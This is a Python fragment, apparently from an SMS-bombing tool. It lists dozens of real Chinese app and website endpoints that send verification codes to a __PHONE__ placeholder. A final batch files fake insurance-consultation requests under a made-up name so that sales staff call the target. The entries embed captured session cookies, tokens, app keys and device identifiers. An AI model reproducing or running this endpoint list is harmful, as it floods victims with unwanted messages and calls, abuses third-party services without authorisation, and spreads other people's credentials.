                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app"
            ),
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        },
        "data": {
            "mobile": "__PHONE__",
            "account": "",
            "password": "",
            "version": 39,
            "channeltype": 120,
        },
    },
    {
        "name": "h3cservice.h3c.com",
        "method": "POST",
        "url": "https://h3cservice.h3c.com/Sms/SendCode",
        "headers": {
            "Host": "h3cservice.h3c.com",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Site": "same-origin",
            "Accept-Language": "zh-cn",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Mode": "cors",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://h3cservice.h3c.com",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148"
            ),
            "Referer": "https://h3cservice.h3c.com/",
            "Cookie": "ASP.NET_SessionId=2r5oyngghmdzudflqq5r3tu3",
            "Sec-Fetch-Dest": "empty",
            "Connection": "keep-alive",
        },
        "data": "PhoneNumber=__PHONE__",
    },
    {
        "name": "mall.xyhljls.com",
        "method": "GET",
        "url": (
            "https://mall.xyhljls.com/api/member/msg_send?mobile=__PHONE__&type=check&app_key=1&"
            "request_id=1773450441839&MALL-SIGN=de%2BL4WZHbhDe%2FREgaPfK2us4mc7nBbn83IPtGyjIXWBwGQ20XQHI2NrYt%2BZ"
            "w2Ys3jLLe7YnZLkRDkXSdiJP9o2VTAo4JD%2B33CJWTOOZGxwOG70j5smUSvyDj2tGAo6%2BD"
        ),
        "headers": {
            "Host": "mall.xyhljls.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Applet-Authorization": "L1E/iDMNQJsThT1CE8Jr1g==",
            "Cookie": "SESSION=MmM5OGUzMWQtNzgyNC00NmFmLWEyMGUtMGY2NTNlOWQ4ZDhi",
            "Accept": "*/*",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app"
            ),
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        },
    },
    {
        "name": "api.jihuanshe.com",
        "method": "POST",
        "url": "https://api.jihuanshe.com/api/market/auth/send-sms",
        "headers": {
            "Host": "api.jihuanshe.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "Connection": "keep-alive",
            "x-device-id": "3CB80B8B-579E-49DF-9090-EE9299DE31D7",
            "Accept": "*/*",
            "User-Agent": "jihuanshe_ios/3.35.0 (com.jihuanshe.app; build:75; iOS 18.7.0) Alamofire/5.4.4 iphone",
            "Accept-Language": "zh-Hans-CN;q=1.0",
            "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
        },
        "data": "check_phone_exists=0&phone=__PHONE__&region_code=%2B86",
    },
    {
        "name": "hsjapi.hulian120.com",
        "method": "POST",
        "url": "https://hsjapi.hulian120.com/userService/api/app/user/nurse/login/loginPhoneSendCode",
        "headers": {
            "Host": "hsjapi.hulian120.com",
            "businessSource": "1",
            "User-Env": "MiniProgram",
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Sec-Fetch-Site": "same-site",
            "requestId": "1773450441839",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Mode": "cors",
            "terminalPlatform": "2",
            "Origin": "https://ai.hulian120.com",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004431) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://ai.hulian120.com/",
            "activity": "3248923489234",
            "loginType": "WEB_AI",
            "Sec-Fetch-Dest": "empty",
            "Connection": "keep-alive",
        },
        "data": {"loginType": "1", "phone": "__PHONE__"},
    },
    {
        "name": "api.chezhubei.com",
        "method": "POST",
        "url": "https://api.chezhubei.com/app/api/app/public/sendSmsCode",
        "headers": {
            "User-Agent": (
                "Mozilla/5.0 (Linux; Android 10; YAL-AL10 Build/HUAWEIYAL-AL10; wv) AppleWebKit/537.36 (KHTML,"
                " like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 uni-app Html5Plus/1.0 "
                "(Immersed/40.666668)"
            ),
            "Connection": "Keep-Alive",
            "Accept": "application/json",
            "Accept-Encoding": "gzip",
            "Authorization": "",
            "X-Channel": "huawei",
            "X-Platform": "APP-ANDROID",
            "X-Version": "czb-app/1.0.13",
            "X-Oaid": "5a00c3cd-f243-4ef1-9cac-37e4311e83a1",
            "Content-Type": "application/json; charset=utf-8",
        },
        "data": {"phone": "__PHONE__"},
    },
    {
        "name": "job.sdjuliangnet.com",
        "method": "POST",
        "url": "https://job.sdjuliangnet.com/chaoapi.php/index/sendsms",
        "headers": {
            "Host": "job.sdjuliangnet.com",
            "Content-Type": "application/json",
            "Connection": "keep-alive",
            "Accept": "*/*",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app"
            ),
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        },
        "data": {
            "type": 1,
            "tel": "__PHONE__",
            "app_id": 4,
            "channel": 55,
            "oaid": "uniapp",
            "userToken": "",
            "api_city": "广州",
            "api_ip_city": "广州",
            "loginType": 4,
            "api_ip": "120.235.13.255",
            "api_ua": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app"
            ),
            "idfa": "",
            "version": "130",
        },
    },
    {
        "name": "new-retail-weixin-gateway-prod.diwangxu.com",
        "method": "POST",
        "url": "https://new-retail-weixin-gateway-prod.diwangxu.com/sms/sendVerifyCode",
        "headers": {
            "Host": "new-retail-weixin-gateway-prod.diwangxu.com",
            "Connection": "keep-alive",
            "callSource": "https://new-retail-h5-prod.diwangxu.com",
            "Appkey": "APP",
            "sessionGenerateId": "",
            "content-type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wxb7250975c223d5b8/40/page-frame.html",
        },
        "data": {"stringParam": "+86__PHONE__"},
    },
    {
        "name": "jsyapi.evermecon.com",
        "method": "POST",
        "url": "https://jsyapi.evermecon.com/timelyapi/timelyvoice/auth/sendAuthCode",
        "headers": {
            "Host": "jsyapi.evermecon.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Connection": "keep-alive",
            "Accept": "*/*",
            "X-Device": (
                "eyJjb3JlX3ZlcnNpb24iOiIyIiwiZGV2aWNlX25hbWUiOiJpUGhvbmUgMTEiLCJzb2Z0X3ZlcnNpb24iOiIyLjMiLCJzeXN0ZW1f"
                "dmVyc2lvbiI6ImlvczE4LjcifQ=="
            ),
            "apiInfo": (
                "{\"osInfo\":\"18.7\",\"brand\":\"apple\",\"buildVersion\":\"5\",\"version\":\"2.3\",\"appKey\":\"1\",\"plat\":\"ios\","
                "\"model\":\"iPhone 11\",\"appId\":\"1\",\"channel\":\"100\"}"
            ),
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "User-Agent": "TimelyRemind/2 CFNetwork/3826.600.41 Darwin/24.6.0",
        },
        "data": "mobile=__PHONE__&type=1",
    },
    {
        "name": "ly.shandongtowngas.com.cn:8015",
        "method": "POST",
        "url": (
            "http://ly.shandongtowngas.com.cn:8015/BleDevicePayPlatform/app/jihua/getAuthCode.do?authCodeType=0&"
            "mobile=__PHONE__&version=1.4.6&timestamp=1773450441839"
        ),
        "headers": {
            "Host": "ly.shandongtowngas.com.cn:8015",
            "Content-Type": "application/json",
            "Connection": "keep-alive",
            "Proxy-Connection": "keep-alive",
            "Accept": "*/*",
            "User-Agent": "%E8%93%9D%E7%89%99%E5%85%85%E5%80%BC%E6%98%93/1 CFNetwork/3826.600.41 Darwin/24.6.0",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        },
        "data": {"mobile": "__PHONE__", "authCodeType": "0"},
    },
    {
        "name": "mfapi.greenlr.com",
        "method": "POST",
        "url": "https://mfapi.greenlr.com/sendSms/getCheckCode",
        "headers": {
            "Host": "mfapi.greenlr.com",
            "Accept": "*/*",
            "appSecret": "akffas7239hrewoqriewqr",
            "source": "ios",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-Hans-CN;q=1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "memberCash/9.10 (iPhone; iOS 18.7; Scale/2.00)",
            "appKey": "roiueqo9023jofjlajfdj",
            "Connection": "keep-alive",
            "sign": "DE8B45B8203F6A08391147A72BB45654",
        },
        "data": "phone=__PHONE__&type=1",
    },
    {
        "name": "m.94lives.com",
        "method": "POST",
        "url": "https://m.94lives.com/api/auth/sendPhoneCode",
        "headers": {
            "Host": "m.94lives.com",
            "deviceNumber": "BB976B03-70D7-4602-BD6F-2E8EF576A7B8",
            "Content-Type": "application/json;charset=UTF-8",
            "Authorization": "",
            "Accept": "*/*",
            "browserType": "iOS",
            "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
            "iOSVersion": "1.1.9",
            "cid": "",
            "Accept-Language": "zh-Hans-CN;q=1.0",
            "clientType": "iOS",
            "language": "0",
            "User-Agent": "94LIVES/1.1.9 (com.ninetyfour.cn; build:60; iOS 18.7.0) Alamofire/5.10.2",
            "currency": "23",
            "Cookie": "JSESSIONID=6AF60A037165361453056A2AC292ADBB",
            "qwer": (
                "eyJhZGRyZXNzIjoi5bm/5bee5biCLCDlub/kuJznnIEsIOS4reWbvSIsImxvbmdpdHVkZSI6MTEzLjQ3NzkwNDgwODkzMzU3LCJs"
                "YXRpdHVkZSI6MjMuNDMzNjIzMjI2MDMzNTk2fQ=="
            ),
            "Connection": "keep-alive",
        },
        "data": {
            "captchaVerification": "",
            "countryCode": "CN",
            "phone": "__PHONE__",
            "type": "2",
            "areaCode": "86",
        },
    },
    {
        "name": "app.bac365.com",
        "method": "POST",
        "url": "https://app.bac365.com/camel_wechat_mini_oil_server/sendVerifyMessage",
        "headers": {
            "Host": "app.bac365.com",
            "channel": "app",
            "Content-Type": "application/json",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Accept": "*/*",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app"
            ),
            "timestamp": "1773450441",
            "Authorization": "Bearer ",
            "Content-Length": "39",
        },
        "data": {"phone": "__PHONE__", "channel": "app"},
    },
    {
        "name": "api.mall.leyifan.cn",
        "method": "GET",
        "url": "https://api.mall.leyifan.cn/api/front/phone/sendSmsCode?phone=__PHONE__",
        "headers": {
            "Host": "api.mall.leyifan.cn",
            "system": "ios",
            "Accept": "*/*",
            "App-Version": "30822",
            "Clientid": "37a3cffb-f033-4267-b16d-e21fbbb759593",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "platform": "app",
            "Content-Type": "application/json",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app"
            ),
            "lang": "chs",
            "Appplatform": "ios_cn",
            "Origin-channel": "ios_cn",
            "Cookie": "https_waf_cookie=d8f6cb86-1ef5-4babf2e02f144500a8071f58dc7448bb82cb",
            "UseDomain": "leyifan",
            "Connection": "keep-alive",
        },
    },
    {
        "name": "baojianstore.com",
        "method": "GET",
        "url": (
            "https://www.baojianstore.com/Appshop/AppShopHandler.ashx?action=VerficationPhoneOrEmail&"
            "value=__PHONE__"
        ),
        "headers": {
            "Host": "www.baojianstore.com",
            "Accept": "*/*",
            "Origin": "https://h5.baojian.com",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148"
            ),
            "Referer": "https://h5.baojian.com/",
            "Sec-Fetch-Dest": "empty",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
        },
    },
    {
        "name": "d2m0k739byzwun.cloudfront.net",
        "method": "POST",
        "url": "https://d2m0k739byzwun.cloudfront.net/api/app/notification/captcha",
        "headers": {
            "User-Agent": (
                "DevID%3Dlld5a00c3cd-f243-4ef1-9cac-37e4311e83a1%3BDevType%3DHWYAL%3A29%3Aid%3DHUAWEIYAL-AL10%3BSysTy"
                "pe%3Dandroid%3BVer%3D1.3.1%3BBuildID%3Ddark.jaYec.msLgF%3BMac%3DD2%3ADF%3AB6%3AA2%3AB2%3A97%3BGlobal"
                "DevID%3Dnull"
            ),
            "Accept-Encoding": "*",
            "Content-Type": "application/json",
            "x-api-key": (
                "timestamp=1773450441;sign=8dd5664c04fb929be7ec5f69a3319af8a9c6adc8;nonce=61317618-95bb-45b2-9dc7-b1a"
                "c7135cca3"
            ),
            "device": "android",
            "authorization": (
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0aW1lc3RhbXAiOjE3NzAyODQ4MzMwNzc5OTQ1MDAsInR5cGUiOjAsInVpZCI"
                "6NTQ2ODgyNjN9.jw5QCTHSA3X_1WOAT8o1lHiyILJDuUUP1tuYp8cDjHE"
            ),
            "api_version": "1.0.0",
            "content-type": "application/json;charset=UTF-8",
        },
        "data": {"type": 1, "mobile": "+86__PHONE__"},
    },
    {
        "name": "shanxiaobai.com",
        "method": "POST",
        "url": "https://www.shanxiaobai.com/app.html?is_api=1&act=sms",
        "headers": {
            "Host": "www.shanxiaobai.com",
            "X-DEVICE-OS-PRODUCT": "iPhone12,1",
            "X-Api-Ver": "36",
            "Cookie": "PHPSESSID=uvsicg4sm7ta7quuu9i4rm2l81",
            "User-Agent": "WhiteGoods/3.3.0 (iPhone; iOS 18.7; Scale/2.00)",
            "X-App-Name": "com.uping.white",
            "X-DEVICE-OS-VER": "18.7",
            "X-DEVICE-TYPE": "ios",
            "X-DEVICE-TOKEN": "612cd2033713ef86e7c19ab1a3b48e6d96f836265f8f1e8671c70282396485b4",
            "X-DEVICE-OS": "IOS",
            "X-App-Ver": "3.3.0",
            "Accept-Language": "zh-Hans-CN;q=1",
            "IDFV": "889E8142-68CF-42C3-875C-6F2B8386CD12",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-TOKEN": "",
            "Accept-Encoding": "gzip, deflate, br",
            "IDFA": "",
            "Connection": "keep-alive",
        },
        "data": "mobile=__PHONE__&type=login",
    },
    {
        "name": "api.daxianghome.com",
        "method": "GET",
        "url": "https://api.daxianghome.com/user/login?mobile=__PHONE__",
        "headers": {
            "Host": "api.daxianghome.com",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": "DaXiang/1.7.1 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        },
    },
    {
        "name": "app.tuozhe8.com",
        "method": "POST",
        "url": "https://app.tuozhe8.com/v2/Login/alidayu_sms",
        "headers": {
            "Host": "app.tuozhe8.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive",
            "Accept": "*/*",
            "User-Agent": "TZDesignApp/202404131530 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1",
            "Accept-Encoding": "gzip, deflate, br",
        },
        "data": "mobile=__PHONE__&validate=&version=3.5.1",
    },
    {
        "name": "agent.jieyoucloud.com",
        "method": "POST",
        "url": "https://agent.jieyoucloud.com/api/v1/sendSmsVerificationCode?phoneNumber=__PHONE__",
        "headers": {
            "Host": "agent.jieyoucloud.com",
            "Connection": "keep-alive",
            "content-type": "application/x-www-form-urlencoded",
            "Authorization": "Bearer ",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wx979378000669bc89/57/page-frame.html",
        },
    },
    {
        "name": "api.zhiguohulian.com",
        "method": "GET",
        "url": (
            "https://api.zhiguohulian.com/webapp/v1/user/code?phone=__PHONE__&package=xiaozhi&thirdparty=xiaozhi"
        ),
        "headers": {
            "Host": "api.zhiguohulian.com",
            "Connection": "keep-alive",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004432) NetType/4G Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wx96983c5aa4a177cb/20/page-frame.html",
        },
    },
    {
        "name": "tg-admin-api.916sy.com",
        "method": "POST",
        "url": "https://tg-admin-api.916sy.com/api/auth/register_get_phone",
        "headers": {
            "Host": "tg-admin-api.916sy.com",
            "Connection": "keep-alive",
            "From-Type": "wxMiNi",
            "content-type": "application/x-www-form-urlencoded",
            "Access-Token": "",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wxa46b3fcee3827fcb/1/page-frame.html",
        },
        "data": "phone=__PHONE__",
    },
]


# ==================== 第三批：后补的两个接口 ====================

FLOW_ENDPOINTS: list[Endpoint] = [
    {
        "name": "customer-apply-diversion.teddymobile.cn",
        "method": "POST",
        "url": "https://customer-apply-diversion.teddymobile.cn/api/v1/auth/sendSms",
        "headers": {
            "host": "customer-apply-diversion.teddymobile.cn",
            "xweb_xhr": "1",
            "user-agent": "__UA__",
            "content-type": "application/json",
            "accept": "*/*",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://servicewechat.com/wxf123c0cb425589de/5/page-frame.html",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "zh-CN,zh;q=0.9",
            "priority": "u=1, i",
        },
        "data": {"phone": "__PHONE__"},
    },
    {
        "name": "yiqilai.net.cn",
        "method": "POST",
        "url": "https://yiqilai.net.cn/authorization/auth/sendValidateMsg",
        "headers": {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "yiqilai.net.cn",
            "PROJECT-CODE": "72014",
            "Referer": "https://servicewechat.com/wxd354b6655f7d129a/10/page-frame.html",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "SunnyNetHTTPClient": "true",
            "User-Agent": "__UA__",
            "xweb_xhr": "1",
        },
        "data": {"phone": "__PHONE__"},
    },
]


# ==================== 第四批：保险类预约 / 留资接口 ====================

INSURANCE_ENDPOINTS: list[Endpoint] = [
    {
        "name": "m.zhongmin.cn",
        "method": "POST",
        "url": "https://m.zhongmin.cn/Topic/AddYuyueNew",
        "headers": {
            "Host": "m.zhongmin.cn",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "__UA__",
            "Accept": "*/*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://m.zhongmin.cn",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": (
                "https://m.zhongmin.cn/benefitGuarantee/Index?&miniprogram=1&isarticle=0&miniphone=&cityid=&"
                "openid=o_-GO4k4GF7wKK1edUGK-e3YKxtI&areaCode="
            ),
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        },
        "data": "name=救赎&phone=__PHONE__&sex=0&type=1306&des=惠民保障预约",
        "cookies": {
            "ASP.NET_SessionId": "xbg1wz02h2ebhydki1uwcpdg",
            "cookieUserName": "cookie0F4D39BF5852DA4D2376B66403A635D9",
            "areaCodeOut": "Code%3D",
            "Hm_lvt_6c7f533b7cc67b6f40de81580fec468e": "1754308837",
            "HMACCOUNT": "28B89CEFEC2F563F",
            "userId": "14808934",
            "tokenZM": "57315b3f242c460cb55c76402220baa0",
            "referrer": "",
            "UVTOKEN": "M7c786431bbe94da89ffa67683c4df869",
            "miniprogram": "1",
            "Hm_lpvt_6c7f533b7cc67b6f40de81580fec468e": "1754373078",
            "areaCode": "HMBGDW04202",
            "isFirstLogin": "true",
        },
    },
    {
        "name": "xiaoyusan.com",
        "method": "POST",
        "url": "https://www.xiaoyusan.com/Phonecrm/createOuterActNoLogin",
        "headers": {
            "Host": "www.xiaoyusan.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-Sh-Traceid": "936e759279edc705dfdf4c3dab890cec",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "sec-ch-ua-mobile": "?1",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "__UA__",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.xiaoyusan.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": (
                "https://www.xiaoyusan.com/shk/wkpage/index/38376d_2023000830.1.html?eva=2023000830&"
                "chn=mlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008&wkpushstate=1754377971445"
            ),
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        },
        "data": (
            "chn=mlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008&eva=2023000830&name=救赎&mobile=__PHONE__&"
            "cbs=&biztype=&act_name=cal_insure_no_verify&outer_act_link=https%3A%2F%2Fwww.xiaoyusan.com%2Fshk%2Fw"
            "kpage%2Findex%2F38376d_2023000830.1.html%3Feva%3D2023000830%26chn%3Dmlxm-gzh-jbpyl-xxsj-zhengweiqian"
            "g-1v1zx-h5-xys-01-cp-008%26wkpushstate%3D1754377971445&"
            "remark=%E4%B8%BA%E8%B0%81%E5%AE%9A%E5%88%B6%EF%BC%9A%E8%87%AA%E5%B7%B1%2C%E8%B4%AD%E4%B9%B0%E9%99%A9"
            "%E7%A7%8D%EF%BC%9A%E9%87%8D%E7%96%BE%E9%99%A9"
        ),
        "cookies": {
            "acw_tc": "0a0011e917543779705586941e5a05034d5f35d8fc1bf2cbdaaf1ab34504fe",
            "PHPSESSID": "d593e37a75386f616c013f451ad09d58",
            "touchurl": "http%3A%2F%2Fwww.xiaoyusan.com%2Factivity%2FbasicActActionV2%2FgetActUserInfo",
            "_xys_fd_id": "d593e37a75386f616c013f451ad09d58",
            "_xys_s_id": "xbehat7atj7m0u3ry1f8605fwkqs1qwb",
            "Hm_lvt_8dd2422e78fa31be4e5f5469ebe50589": "1754377971",
            "Hm_lpvt_8dd2422e78fa31be4e5f5469ebe50589": "1754377971",
            "HMACCOUNT": "28B89CEFEC2F563F",
            "_ga": "GA1.2.1558367497.1754377974",
            "_gid": "GA1.2.1201782440.1754377974",
            "_gat_gtag_UA_118701918_1": "1",
            "SERVERID": "0eb4557f6237e94d9e97f8fbc080f699|1754377978|1754377970",
            "SERVERCORSID": "0eb4557f6237e94d9e97f8fbc080f699|1754377978|1754377970",
        },
    },
    {
        "name": "cps.qixin18.com",
        "method": "POST",
        "url": "https://cps.qixin18.com/v3/m/api/common/sendReservatSmsCode?md=0.4350888810127329",
        "headers": {
            "Host": "cps.qixin18.com",
            "Connection": "keep-alive",
            "traceparent": "00-ec6e919fb633d89b0cfe89478947868c-600925b4aada7870-01",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "__UA__",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://cps.qixin18.com",
            "X-Requested-With": "com.tencent.mm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": (
                "https://cps.qixin18.com/m/apps/cps/bxn1096837/product/detail?prodId=104994&planId=130301&tenantId=0&"
                "createTime=1737170298565&beidouWxDistinctId=1754393057537-3919538-085c85ad06848e-55739345&"
                "beidouWxLoginId="
            ),
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        },
        "data": {
            "telephone": "__PHONE__",
            "nvcData": (
                "%7B%22a%22%3A%22FFFF000000000176F978%22%2C%22c%22%3A%221754393074418%3A0.11043106819183113%22%2C%22d"
                "%22%3A%22nvc_message_h5%22%2C%22h%22%3A%7B%22key1%22%3A%22code0%22%2C%22nvcCode%22%3A400%2C%22umidTo"
                "ken%22%3A%22T2gAS31uagM2X-E0z2j2JuoQ9YfSR0ti-jqcPAZIthsx8iZBAl1Z7vDTZfx5_2e30Ok%3D%22%7D%2C%22j%22%3"
                "A%7B%22test%22%3A1%7D%2C%22b%22%3A%22140%23j5ToaOeezzPXyQo2FxBQA3SoYtkr1PCOldd96z9Jk1L06PJD5Csanhp61"
                "jGBhxAOoVmS%2FihPGjWXxp1L25stjOCDyzldmtrj7u2yz%2BDQzPgflp1zzXE62m9NBQzxOmHK9pJjzzrb22U3l61x0b2IV2VjU"
                "QDa2DcR0uG8zbzeP183l6TzDDrbnxEl6gfa2Pc3Vtg2zFzB2ws9lUWLz8riE2h%2F8brzHs83K3JjzFzb2LDZlQ5xOPFbciCqlQz"
                "z2nH%2BV31QFQzXHO83l6TzH8rb8Og%2FxF%2Bx2PD3VtCfzxfS2dAWl3MzzDxiVOGl3lbzzyc4Vpg%2FzdrI2osYPfSzMrMiV2E"
                "%2FlMTx2Pp%2BN3lqoF%2B4211WlplJzPKvV2TcxQ4d2P4JhoMTzTbi2U5pl4Qo5fzI2z6HkHmijDapVrMn%2F2I4jearIkM%2BI"
                "XKnqdqAtmQLHluyyuI%2FLigLnFwu90YKzhKsb4MDX2%2Fj3fxaTvyx2GBaAp5hxz5FTZvsc5b9yd3BvpPfvycy8%2BU8kSOYW1P"
                "u0POhXQZtYobTZuDZ6%2FhIWU2ok8qzwNyRoBa7J0%2F5uBUFxw5aUEzMw%2FHintdyKouRJHkIIDm9e6uDyY6hgi%2BmDMY%2BD"
                "xS03%2F6TRMqlrLnIKxrYLShpPGwIbvhA7bssFKsXax2qHT8RFT8QieM55h3b5be%2FYoEHt0XcJzgvBtq5JGRo8DD1lUjpOlxOk"
                "ZU3N78niCXLo8VlzZaxVXRCuOcKqiNLCMG%2F5sd9MOt3ChJC36pNbGoKkxCGNduPxPqZXFyHJSfsebfJICy%2BbT1xqiIJacOtb"
                "d4%2FWF6o2JgslXqz3Dc3Kp1zilUb2d2ZioK5KDnJP5bHcLtXNxRVR%2BrR4Msg8v82no70sAg2O3qjfuqW3LFamluYz47%2BjwW"
                "U82KW5ucAUQtcsIm436iZ3%2F1%2B4Xc%2FvBJ3ngE3%2FtH6SWNjM5k4wKuYLhCgUgmqDB1z3LUcVMDwNYGD0zDSZrdyVY3jraU"
